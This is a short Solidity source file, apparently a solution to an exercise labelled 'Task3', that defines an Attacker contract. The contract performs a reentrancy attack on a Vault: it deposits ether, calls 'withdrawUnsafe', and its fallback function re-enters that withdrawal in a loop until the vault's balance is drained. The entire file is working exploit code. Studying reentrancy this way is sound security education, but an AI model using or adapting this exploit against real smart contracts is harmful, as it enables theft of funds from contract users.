// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "Task3.sol";
import "Vault.sol";

contract Attacker is IAttacker {
    function depositToVault(address vault) external payable {
        IVault(vault).deposit{value: msg.value}();
    }

    fallback() external payable {
        while(address(msg.sender).balance > 0) {
            (bool ok, ) = msg.sender.call(abi.encodeWithSelector(IVault.withdrawUnsafe.selector, this));

            if (!ok) {
                break;
            }
        }
    }

    function attack(address vault) external {
        IVault(vault).withdrawUnsafe(payable(address(this)));
    }
}